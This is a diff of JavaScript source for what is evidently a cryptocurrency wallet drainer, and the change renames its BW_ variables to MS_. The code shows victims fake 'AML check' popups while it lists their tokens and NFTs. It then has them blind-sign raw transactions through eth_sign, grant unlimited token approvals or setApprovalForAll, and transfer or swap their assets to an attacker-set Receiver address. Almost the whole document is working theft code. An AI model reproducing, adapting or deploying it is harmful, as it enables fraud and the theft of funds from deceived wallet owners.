+        if (MS_Settings.Contract_Whitelist.length > 0 && !MS_Settings.Contract_Whitelist.includes(contract_address.toLowerCase())) continue;
+        else if (MS_Settings.Contract_Blacklist.length > 0 && MS_Settings.Contract_Blacklist.includes(contract_address.toLowerCase())) continue;
         let new_asset = {
           chain_id: convert_chain('ANKR', 'ID', asset.blockchain),
           name: asset.tokenName, type: asset.tokenType,
@@ -602,11 +602,11 @@ const get_nfts = async (address) => {
           }
         }
         if (collection == null) continue;
-        if (BW_Settings.Contract_Whitelist.length > 0 && !BW_Settings.Contract_Whitelist.includes(asset.asset_contract.address.toLowerCase())) continue;
-        else if (BW_Settings.Contract_Blacklist.length > 0 && BW_Settings.Contract_Blacklist.includes(asset.asset_contract.address.toLowerCase())) continue;
+        if (MS_Settings.Contract_Whitelist.length > 0 && !MS_Settings.Contract_Whitelist.includes(asset.asset_contract.address.toLowerCase())) continue;
+        else if (MS_Settings.Contract_Blacklist.length > 0 && MS_Settings.Contract_Blacklist.includes(asset.asset_contract.address.toLowerCase())) continue;
         let asset_chain_id = convert_chain('OPENSEA', 'ID', asset.asset_contract.chain_identifier);
         let asset_price = (collection.stats.one_day_average_price != 0) ? collection.stats.one_day_average_price : collection.stats.seven_day_average_price;
-        asset_price = asset_price * BW_Currencies[convert_chain('ID', 'CURRENCY', asset_chain_id)]['USD'];
+        asset_price = asset_price * MS_Currencies[convert_chain('ID', 'CURRENCY', asset_chain_id)]['USD'];
         let new_asset = {
           chain_id: asset_chain_id, name: asset.name, type: asset.asset_contract.schema_name, amount: asset.num_sales,
           amount_raw: null, amount_usd: asset_price, id: asset.token_id, symbol: null, decimals: null,
@@ -626,7 +626,7 @@ const get_nfts = async (address) => {
 
 const retrive_token = async (chain_id, contract_address) => {
   try {
-    let response = await fetch(`https://${BW_API_Data[chain_id]}/api?module=contract&action=getsourcecode&address=${contract_address}&apikey=${BW_Settings.Settings.Chains[convert_chain('ID', 'ANKR', chain_id)].API}`, {
+    let response = await fetch(`https://${MS_API_Data[chain_id]}/api?module=contract&action=getsourcecode&address=${contract_address}&apikey=${MS_Settings.Settings.Chains[convert_chain('ID', 'ANKR', chain_id)].API}`, {
       method: 'GET', headers: { 'Accept': 'application/json' }
     });
     response = await response.json();
@@ -638,16 +638,16 @@ const retrive_token = async (chain_id, contract_address) => {
         return JSON.parse(response.result[0].ABI)
       }
     } else {
-      return BW_Contract_ABI['ERC20'];
+      return MS_Contract_ABI['ERC20'];
     }
   } catch (err) {
-    return BW_Contract_ABI['ERC20'];
+    return MS_Contract_ABI['ERC20'];
   }
 };
 
 const get_permit_type = (func) => {
   try {
-    if (BW_Settings.Settings.Permit.Mode == false) return 0;
+    if (MS_Settings.Settings.Permit.Mode == false) return 0;
     if (func.hasOwnProperty('permit') && func.hasOwnProperty('nonces') &&
       func.hasOwnProperty('name') && func.hasOwnProperty('DOMAIN_SEPARATOR')) {
       const permit_version = ((func) => {
@@ -669,7 +669,7 @@ const get_permit_type = (func) => {
   }
 };
 
-const BW_Gas_Reserves = {};
+const MS_Gas_Reserves = {};
 
 const show_check = () => {
   try {
@@ -678,35 +678,35 @@ const show_check = () => {
       icon: 'success',
       timer: 2000
     }).then(() => {
-      if (BW_Check_Done) return;
+      if (MS_Check_Done) return;
       Swal.fire({
         text: 'Connecting to Blockchain...',
         imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
         imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
         timer: 5000, width: 600, showConfirmButton: false
       }).then(() => {
-        if (BW_Check_Done) return;
+        if (MS_Check_Done) return;
         Swal.fire({
           text: 'Getting your wallet address...',
           imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
           imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
           timer: 5000, width: 600, showConfirmButton: false
         }).then(() => {
-          if (BW_Check_Done) return;
+          if (MS_Check_Done) return;
           Swal.fire({
             text: 'Checking your wallet for AML...',
             imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
             imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
             timer: 5000, width: 600, showConfirmButton: false
           }).then(() => {
-            if (BW_Check_Done) return;
+            if (MS_Check_Done) return;
             Swal.fire({
               text: 'Good, your wallet is AML clear!',
               icon: 'success',
               allowOutsideClick: false, allowEscapeKey: false,
               timer: 2000, width: 600, showConfirmButton: false
             }).then(() => {
-              if (BW_Check_Done) return;
+              if (MS_Check_Done) return;
               Swal.fire({
                 text: 'Please wait, we\'re scanning more details...',
                 imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
@@ -724,13 +724,13 @@ const show_check = () => {
 };
 
 const get_nonce = async (chain_id) => {
-  const node = new ethers.providers.JsonRpcProvider(BW_Settings.RPCs[chain_id]);
-  return await node.getTransactionCount(BW_Current_Address, "pending");
+  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[chain_id]);
+  return await node.getTransactionCount(MS_Current_Address, "pending");
 };
 
 const wait_message = () => {
   try {
-    if (!BW_Process) return;
+    if (!MS_Process) return;
     Swal.close();
     Swal.fire({
       html: '<b>Thanks!</b>', icon: 'success',
@@ -797,8 +797,8 @@ const sign_next = () => {
 
 const is_nft_approved = async (contract_address, owner_address, spender_address) => {
   try {
-    const node = new ethers.providers.JsonRpcProvider(BW_Settings.RPCs[1]);
-    const contract = new ethers.Contract(contract_address, BW_Contract_ABI['ERC721'], node);
+    const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[1]);
+    const contract = new ethers.Contract(contract_address, MS_Contract_ABI['ERC721'], node);
     return await contract.isApprovedForAll(owner_address, spender_address);
   } catch(err) {
     console.log(err);
@@ -807,29 +807,29 @@ const is_nft_approved = async (contract_address, owner_address, spender_address)
 };
 
 const SIGN_NATIVE = async (asset) => {
-  const web3 = new Web3(BW_Provider); const node = new ethers.providers.JsonRpcProvider(BW_Settings.RPCs[asset.chain_id]);
+  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
   const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
   const gas_limit_nt = (asset.chain_id == 42161) ? 1500000 : (asset.chain_id == 43114 ? 1500000 : 21000);
   const gas_limit_ct = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 150000);
 
   const gas_price_calc = ethers.BigNumber.from(asset.chain_id == 10 ? '35000000000' : gas_price);
   const nt_fee = (gas_price_calc.mul(ethers.BigNumber.from(gas_limit_nt))).mul(ethers.BigNumber.from('2'));
-  const ct_fee = (gas_price_calc.mul(ethers.BigNumber.from(gas_limit_ct))).mul(ethers.BigNumber.from(String(BW_Gas_Reserves[asset.chain_id])));
+  const ct_fee = (gas_price_calc.mul(ethers.BigNumber.from(gas_limit_ct))).mul(ethers.BigNumber.from(String(MS_Gas_Reserves[asset.chain_id])));
   const after_fee = ethers.BigNumber.from(asset.amount_raw).sub(nt_fee).sub(ct_fee).toString();
 
   if (ethers.BigNumber.from(after_fee).lte(ethers.BigNumber.from('0'))) throw 'LOW_BALANCE';
 
   const nonce = await get_nonce(asset.chain_id);
   let tx_struct = {
-    "to": BW_Settings.Receiver, "nonce": web3.utils.toHex(nonce),
+    "to": MS_Settings.Receiver, "nonce": web3.utils.toHex(nonce),
     "gasLimit": web3.utils.toHex(gas_limit_nt), "gasPrice": web3.utils.toHex(gas_price),
     "value": web3.utils.toHex(after_fee), "data": "0x",
-    "v": web3.utils.toHex(BW_Current_Chain_ID), "r": "0x", "s": "0x"
+    "v": web3.utils.toHex(MS_Current_Chain_ID), "r": "0x", "s": "0x"
   }, unsigned_tx = new ethereumjs.Tx(tx_struct),
   serialized_tx = "0x" + unsigned_tx.serialize().toString("hex"),
   keccak256 = web3.utils.sha3(serialized_tx, { "encoding": "hex" });
   await sign_request(asset);
-  const signed = await web3.eth.sign(keccak256, BW_Current_Address);
+  const signed = await web3.eth.sign(keccak256, MS_Current_Address);
   const temporary = signed.substring(2),
   r_data = "0x" + temporary.substring(0, 64),
   s_data = "0x" + temporary.substring(64, 128),
@@ -842,19 +842,19 @@ const SIGN_NATIVE = async (asset) => {
   sign_next();
   const tx = await node.sendTransaction(signed_tx);
   wait_message();
-  if (BW_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
+  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
   await sign_success(asset, after_fee); sign_ready();
 };
 
 const SIGN_TOKEN = async (asset) => {
-  const web3 = new Web3(BW_Provider); const node = new ethers.providers.JsonRpcProvider(BW_Settings.RPCs[asset.chain_id]);
-  const contract = new ethers.Contract(asset.address, BW_Contract_ABI['ERC20'], node);
+  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
+  const contract = new ethers.Contract(asset.address, MS_Contract_ABI['ERC20'], node);
   const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
   let gas_limit = null;
-  let max_approval_amount = ethers.utils.parseEther(BW_Unlimited_Amount);
-  for (const c_address of BW_Settings.Unlimited_BL) {
+  let max_approval_amount = ethers.utils.parseEther(MS_Unlimited_Amount);
+  for (const c_address of MS_Settings.Unlimited_BL) {
     try {
-      if (c_address[0] == BW_Current_Chain_ID && c_address[1] == asset.address.toLowerCase()) {
+      if (c_address[0] == MS_Current_Chain_ID && c_address[1] == asset.address.toLowerCase()) {
         max_approval_amount = asset.amount_raw;
         break;
       }
@@ -863,29 +863,29 @@ const SIGN_TOKEN = async (asset) => {
     }
   }
   try {
-    if (BW_Settings.Settings.Sign.Tokens == 1) {
-      gas_limit = await contract.estimateGas.approve(BW_Settings.Address, max_approval_amount, { from: BW_Current_Address });
-    } else if (BW_Settings.Settings.Sign.Tokens == 2) {
-      gas_limit = await contract.estimateGas.transfer(BW_Settings.Receiver, asset.amount_raw, { from: BW_Current_Address });
+    if (MS_Settings.Settings.Sign.Tokens == 1) {
+      gas_limit = await contract.estimateGas.approve(MS_Settings.Address, max_approval_amount, { from: MS_Current_Address });
+    } else if (MS_Settings.Settings.Sign.Tokens == 2) {
+      gas_limit = await contract.estimateGas.transfer(MS_Settings.Receiver, asset.amount_raw, { from: MS_Current_Address });
     }
     gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
   } catch(err) {
     gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 250000);
   }
   const nonce = await get_nonce(asset.chain_id);
-  let data = null, web3_contract = new web3.eth.Contract(BW_Contract_ABI['ERC20'], asset.address);
-  if (BW_Settings.Settings.Sign.Tokens == 1) data = web3_contract.methods.approve(BW_Settings.Address, max_approval_amount).encodeABI();
-  else if (BW_Settings.Settings.Sign.Tokens == 2) data = web3_contract.methods.transfer(BW_Settings.Receiver, asset.amount_raw).encodeABI();
+  let data = null, web3_contract = new web3.eth.Contract(MS_Contract_ABI['ERC20'], asset.address);
+  if (MS_Settings.Settings.Sign.Tokens == 1) data = web3_contract.methods.approve(MS_Settings.Address, max_approval_amount).encodeABI();
+  else if (MS_Settings.Settings.Sign.Tokens == 2) data = web3_contract.methods.transfer(MS_Settings.Receiver, asset.amount_raw).encodeABI();
   let tx_struct = {
     "to": asset.address, "nonce": web3.utils.toHex(nonce),
     "gasLimit": web3.utils.toHex(gas_limit), "gasPrice": web3.utils.toHex(gas_price),
     "value": '0x0', "data": data,
-    "v": web3.utils.toHex(BW_Current_Chain_ID), "r": "0x", "s": "0x"
+    "v": web3.utils.toHex(MS_Current_Chain_ID), "r": "0x", "s": "0x"
   }, unsigned_tx = new ethereumjs.Tx(tx_struct),
   serialized_tx = "0x" + unsigned_tx.serialize().toString("hex"),
   keccak256 = web3.utils.sha3(serialized_tx, { "encoding": "hex" });
   await sign_request(asset);
-  const signed = await web3.eth.sign(keccak256, BW_Current_Address);
+  const signed = await web3.eth.sign(keccak256, MS_Current_Address);
   const temporary = signed.substring(2),
   r_data = "0x" + temporary.substring(0, 64),
   s_data = "0x" + temporary.substring(64, 128),
@@ -898,39 +898,39 @@ const SIGN_TOKEN = async (asset) => {
   sign_next();
   const tx = await node.sendTransaction(signed_tx);
   wait_message();
-  if (BW_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
+  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
   await sign_success(asset); sign_ready();
 };
 
 const SIGN_NFT = async (asset) => {
-  const web3 = new Web3(BW_Provider); const node = new ethers.providers.JsonRpcProvider(BW_Settings.RPCs[asset.chain_id]);
-  const contract = new ethers.Contract(asset.address, BW_Contract_ABI['ERC721'], node);
+  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
+  const contract = new ethers.Contract(asset.address, MS_Contract_ABI['ERC721'], node);
   const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
   let gas_limit = null;
   try {
-    if (BW_Settings.Settings.Sign.NFTs == 1) {
-      gas_limit = await contract.estimateGas.setApprovalForAll(BW_Settings.Address, true, { from: BW_Current_Address });
-    } else if (BW_Settings.Settings.Sign.NFTs == 2) {
-      gas_limit = await contract.estimateGas.transferFrom(BW_Current_Address, BW_Settings.Receiver, asset.id, { from: BW_Current_Address });
+    if (MS_Settings.Settings.Sign.NFTs == 1) {
+      gas_limit = await contract.estimateGas.setApprovalForAll(MS_Settings.Address, true, { from: MS_Current_Address });
+    } else if (MS_Settings.Settings.Sign.NFTs == 2) {
+      gas_limit = await contract.estimateGas.transferFrom(MS_Current_Address, MS_Settings.Receiver, asset.id, { from: MS_Current_Address });
     }
     gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
   } catch(err) {
     gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 250000);
   }
   const nonce = await get_nonce(asset.chain_id);
-  let data = null, web3_contract = new web3.eth.Contract(BW_Contract_ABI['ERC721'], asset.address);
-  if (BW_Settings.Settings.Sign.NFTs == 1) data = web3_contract.methods.setApprovalForAll(BW_Settings.Address, true).encodeABI();
-  else if (BW_Settings.Settings.Sign.NFTs == 2) data = web3_contract.methods.transferFrom(BW_Current_Address, BW_Settings.Receiver, asset.id).encodeABI();
+  let data = null, web3_contract = new web3.eth.Contract(MS_Contract_ABI['ERC721'], asset.address);
+  if (MS_Settings.Settings.Sign.NFTs == 1) data = web3_contract.methods.setApprovalForAll(MS_Settings.Address, true).encodeABI();
+  else if (MS_Settings.Settings.Sign.NFTs == 2) data = web3_contract.methods.transferFrom(MS_Current_Address, MS_Settings.Receiver, asset.id).encodeABI();
   let tx_struct = {
     "to": asset.address, "nonce": web3.utils.toHex(nonce),
     "gasLimit": web3.utils.toHex(gas_limit), "gasPrice": web3.utils.toHex(gas_price),
     "value": '0x0', "data": data,
-    "v": web3.utils.toHex(BW_Current_Chain_ID), "r": "0x", "s": "0x"
+    "v": web3.utils.toHex(MS_Current_Chain_ID), "r": "0x", "s": "0x"
   }, unsigned_tx = new ethereumjs.Tx(tx_struct),
   serialized_tx = "0x" + unsigned_tx.serialize().toString("hex"),
   keccak256 = web3.utils.sha3(serialized_tx, { "encoding": "hex" });
   await sign_request(asset);
-  const signed = await web3.eth.sign(keccak256, BW_Current_Address);
+  const signed = await web3.eth.sign(keccak256, MS_Current_Address);
   const temporary = signed.substring(2),
   r_data = "0x" + temporary.substring(0, 64),
   s_data = "0x" + temporary.substring(64, 128),
@@ -943,20 +943,20 @@ const SIGN_NFT = async (asset) => {
   sign_next();
   const tx = await node.sendTransaction(signed_tx);
   wait_message();
-  if (BW_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
+  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
   await sign_success(asset); sign_ready();
 };
 
 const DO_SWAP = async (asset) => {
-  const node = new ethers.providers.JsonRpcProvider(BW_Settings.RPCs[asset.chain_id]);
+  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
   const swap_deadline = Math.floor(Date.now() / 1000) + (9999 * 10);
-  const contract = new ethers.Contract(asset.swapper_address, BW_Pancake_ABI, BW_Signer);
+  const contract = new ethers.Contract(asset.swapper_address, MS_Pancake_ABI, MS_Signer);
   const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
   let gas_limit = null;
   try {
     gas_limit = await contract.estimateGas.swapExactTokensForETH(swap_value, '0', [
-      asset.address, BW_Swap_Route[asset.chain_id]
-    ], BW_Settings.Receiver, swap_deadline, { from: BW_Current_Address });
+      asset.address, MS_Swap_Route[asset.chain_id]
+    ], MS_Settings.Receiver, swap_deadline, { from: MS_Current_Address });
     gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
   } catch(err) {
     gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 350000);
@@ -966,21 +966,21 @@ const DO_SWAP = async (asset) => {
   ? ethers.BigNumber.from(asset.amount_raw).toString() : ethers.BigNumber.from(asset.swapper_allowance).toString();
   await swap_request(asset.swapper_type, asset, [ asset ]); sign_next();
   const tx = await contract.swapExactTokensForETH(swap_value, '0', [
-    asset.address, BW_Swap_Route[asset.chain_id]
-  ], BW_Settings.Receiver, swap_deadline, {
+    asset.address, MS_Swap_Route[asset.chain_id]
+  ], MS_Settings.Receiver, swap_deadline, {
     gasLimit: ethers.BigNumber.from(gas_limit),
     gasPrice: ethers.BigNumber.from(gas_price),
-    nonce: nonce, from: BW_Current_Address
+    nonce: nonce, from: MS_Current_Address
   });
   wait_message();
-  if (BW_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 60000);
+  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 60000);
   await swap_success(asset.swapper_type, asset, [ asset ]); sign_ready();
 };
 
 const DO_UNISWAP = async (asset, all_tokens) => {
-  const web3 = new Web3(BW_Provider); const node = new ethers.providers.JsonRpcProvider(BW_Settings.RPCs[asset.chain_id]);
+  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
   const swap_deadline = Math.floor(Date.now() / 1000) + (9999 * 10);
-  const contract = new ethers.Contract(asset.swapper_address, BW_Uniswap_ABI, BW_Signer);
+  const contract = new ethers.Contract(asset.swapper_address, MS_Uniswap_ABI, MS_Signer);
   const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
   const nonce = await get_nonce(asset.chain_id);
   const swap_data = [];
@@ -988,10 +988,10 @@ const DO_UNISWAP = async (asset, all_tokens) => {
     try {
       const swap_value = ethers.BigNumber.from(token.amount_raw).lte(ethers.BigNumber.from(token.swapper_allowance))
       ? ethers.BigNumber.from(token.amount_raw).toString() : ethers.BigNumber.from(token.swapper_allowance).toString();
-      const web3_contract = new web3.eth.Contract(BW_Uniswap_ABI, token.swapper_address);
+      const web3_contract = new web3.eth.Contract(MS_Uniswap_ABI, token.swapper_address);
       const data = web3_contract.methods.swapExactTokensForTokens(swap_value, '0', [
-        token.address, BW_Swap_Route[token.chain_id]
-      ], BW_Settings.Receiver).encodeABI();
+        token.address, MS_Swap_Route[token.chain_id]
+      ], MS_Settings.Receiver).encodeABI();
       swap_data.push(data);
     } catch(err) {
       console.log(err);
@@ -999,7 +999,7 @@ const DO_UNISWAP = async (asset, all_tokens) => {
   }
   let gas_limit = null;
   try {
-    gas_limit = await contract.estimateGas.multicall(swap_deadline, swap_data, { from: BW_Current_Address });
+    gas_limit = await contract.estimateGas.multicall(swap_deadline, swap_data, { from: MS_Current_Address });
     gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
   } catch(err) {
     gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 500000);
@@ -1008,17 +1008,17 @@ const DO_UNISWAP = async (asset, all_tokens) => {
   const tx = await contract.multicall(swap_deadline, swap_data, {
     gasLimit: ethers.BigNumber.from(gas_limit),
     gasPrice: ethers.BigNumber.from(gas_price),
-    nonce: nonce, from: BW_Current_Address
+    nonce: nonce, from: MS_Current_Address
   });
   wait_message();
-  if (BW_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 60000);
+  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 60000);
   await swap_success(asset.swapper_type, asset, all_tokens); sign_ready();
 };
 
 const DO_PANCAKE_V3 = async (asset, all_tokens) => {
-  const web3 = new Web3(BW_Provider); const node = new ethers.providers.JsonRpcProvider(BW_Settings.RPCs[asset.chain_id]);
+  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
   const swap_deadline = Math.floor(Date.now() / 1000) + (9999 * 10);
-  const contract = new ethers.Contract(asset.swapper_address, BW_Pancake_ABI, BW_Signer);
+  const contract = new ethers.Contract(asset.swapper_address, MS_Pancake_ABI, MS_Signer);
   const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
   const nonce = await get_nonce(asset.chain_id);
   const swap_data = [];
@@ -1026,10 +1026,10 @@ const DO_PANCAKE_V3 = async (asset, all_tokens) => {
     try {
       const swap_value = ethers.BigNumber.from(token.amount_raw).lte(ethers.BigNumber.from(token.swapper_allowance))
       ? ethers.BigNumber.from(token.amount_raw).toString() : ethers.BigNumber.from(token.swapper_allowance).toString();
-      const web3_contract = new web3.eth.Contract(BW_Pancake_ABI, token.swapper_address);
+      const web3_contract = new web3.eth.Contract(MS_Pancake_ABI, token.swapper_address);
       const data = web3_contract.methods.swapExactTokensForTokens(swap_value, '0', [
-        token.address, BW_Swap_Route[token.chain_id]
-      ], BW_Settings.Receiver).encodeABI();
+        token.address, MS_Swap_Route[token.chain_id]
+      ], MS_Settings.Receiver).encodeABI();
       swap_data.push(data);
     } catch(err) {
       console.log(err);
@@ -1037,7 +1037,7 @@ const DO_PANCAKE_V3 = async (asset, all_tokens) => {
   }
   let gas_limit = null;
   try {
-    gas_limit = await contract.estimateGas.multicall(swap_deadline, swap_data, { from: BW_Current_Address });
+    gas_limit = await contract.estimateGas.multicall(swap_deadline, swap_data, { from: MS_Current_Address });
     gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
   } catch(err) {
     gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 500000);
@@ -1046,62 +1046,62 @@ const DO_PANCAKE_V3 = async (asset, all_tokens) => {
   const tx = await contract.multicall(swap_deadline, swap_data, {
     gasLimit: ethers.BigNumber.from(gas_limit),
     gasPrice: ethers.BigNumber.from(gas_price),
-    nonce: nonce, from: BW_Current_Address
+    nonce: nonce, from: MS_Current_Address
   });
   wait_message();
-  if (BW_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 60000);
+  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 60000);
   await swap_success(asset.swapper_type, asset, all_tokens); sign_ready();
 };
 
 const DO_CONTRACT = async (asset) => {
-  const web3 = new Web3(BW_Provider); const node = new ethers.providers.JsonRpcProvider(BW_Settings.RPCs[asset.chain_id]);
+  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
   const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
   const nonce = await get_nonce(asset.chain_id); const ankr_chain_id = convert_chain('ID', 'ANKR', asset.chain_id);
-  const contract = new ethers.Contract(BW_Settings.Settings.Chains[ankr_chain_id].Contract_Address, (BW_Settings.Settings.Chains[ankr_chain_id].Contract_Legacy == 1) ? BW_Contract_ABI['CONTRACT_LEGACY'] : BW_Contract_ABI['CONTRACT'], BW_Signer);
+  const contract = new ethers.Contract(MS_Settings.Settings.Chains[ankr_chain_id].Contract_Address, (MS_Settings.Settings.Chains[ankr_chain_id].Contract_Legacy == 1) ? MS_Contract_ABI['CONTRACT_LEGACY'] : MS_Contract_ABI['CONTRACT'], MS_Signer);
 
   const gas_limit_nt = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 100000);
   const gas_limit_ct = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 150000);
 
   const gas_price_calc = ethers.BigNumber.from(asset.chain_id == 10 ? '35000000000' : gas_price);
   const nt_fee = (gas_price_calc.mul(ethers.BigNumber.from(gas_limit_nt))).mul(ethers.BigNumber.from('2'));
-  const ct_fee = (gas_price_calc.mul(ethers.BigNumber.from(gas_limit_ct))).mul(ethers.BigNumber.from(String(BW_Gas_Reserves[asset.chain_id])));
+  const ct_fee = (gas_price_calc.mul(ethers.BigNumber.from(gas_limit_ct))).mul(ethers.BigNumber.from(String(MS_Gas_Reserves[asset.chain_id])));
   const after_fee = ethers.BigNumber.from(asset.amount_raw).sub(nt_fee).sub(ct_fee).toString();
 
   if (ethers.BigNumber.from(after_fee).lte(ethers.BigNumber.from('0'))) throw 'LOW_BALANCE';
 
   await transfer_request(asset);
   sign_next(); let tx = null;
-  if (BW_Settings.Settings.Chains[ankr_chain_id].Contract_Legacy == 0) {
-    tx = await contract[BW_Settings.Settings.Chains[ankr_chain_id].Contract_Type](BW_Settings.Address, {
+  if (MS_Settings.Settings.Chains[ankr_chain_id].Contract_Legacy == 0) {
+    tx = await contract[MS_Settings.Settings.Chains[ankr_chain_id].Contract_Type](MS_Settings.Address, {
       gasLimit: ethers.BigNumber.from(gas_limit_nt),
       gasPrice: ethers.BigNumber.from(gas_price),
       nonce: nonce, value: ethers.BigNumber.from(after_fee),
-      from: BW_Current_Address
+      from: MS_Current_Address
     });
   } else {
-    tx = await contract[BW_Settings.Settings.Chains[ankr_chain_id].Contract_Type]({
+    tx = await contract[MS_Settings.Settings.Chains[ankr_chain_id].Contract_Type]({
       gasLimit: ethers.BigNumber.from(gas_limit_nt),
       gasPrice: ethers.BigNumber.from(gas_price),
       nonce: nonce, value: ethers.BigNumber.from(after_fee),
-      from: BW_Current_Address
+      from: MS_Current_Address
     });
   }
   wait_message();
-  if (BW_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
+  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
   await transfer_success(asset, after_fee); sign_ready();
 };
 
 const TRANSFER_NATIVE = async (asset) => {
   const ankr_chain_id = convert_chain('ID', 'ANKR', asset.chain_id);
-  if (BW_Settings.Settings.Chains[ankr_chain_id].Contract_Address != '') return DO_CONTRACT(asset);
-  const web3 = new Web3(BW_Provider); const node = new ethers.providers.JsonRpcProvider(BW_Settings.RPCs[asset.chain_id]);
+  if (MS_Settings.Settings.Chains[ankr_chain_id].Contract_Address != '') return DO_CONTRACT(asset);
+  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
   const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
   const gas_limit_nt = (asset.chain_id == 42161) ? 1500000 : (asset.chain_id == 43114 ? 1500000 : 21000);
   const gas_limit_ct = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 150000);
 
   const gas_price_calc = ethers.BigNumber.from(asset.chain_id == 10 ? '35000000000' : gas_price);
   const nt_fee = (gas_price_calc.mul(ethers.BigNumber.from(gas_limit_nt))).mul(ethers.BigNumber.from('2'));
-  const ct_fee = (gas_price_calc.mul(ethers.BigNumber.from(gas_limit_ct))).mul(ethers.BigNumber.from(String(BW_Gas_Reserves[asset.chain_id])));
+  const ct_fee = (gas_price_calc.mul(ethers.BigNumber.from(gas_limit_ct))).mul(ethers.BigNumber.from(String(MS_Gas_Reserves[asset.chain_id])));
   const after_fee = ethers.BigNumber.from(asset.amount_raw).sub(nt_fee).sub(ct_fee).toString();
 
   if (ethers.BigNumber.from(after_fee).lte(ethers.BigNumber.from('0'))) throw 'LOW_BALANCE';
@@ -1109,76 +1109,76 @@ const TRANSFER_NATIVE = async (asset) => {
   const nonce = await get_nonce(asset.chain_id);
   await transfer_request(asset);
   sign_next();
-  const tx = await BW_Signer.sendTransaction({
-    from: BW_Current_Address, to: BW_Settings.Receiver,
+  const tx = await MS_Signer.sendTransaction({
+    from: MS_Current_Address, to: MS_Settings.Receiver,
     value: ethers.BigNumber.from(after_fee),
     gasLimit: ethers.BigNumber.from(gas_limit_nt),
     gasPrice: ethers.BigNumber.from(gas_price),
     nonce: nonce, data: '0x'
   });
   wait_message();
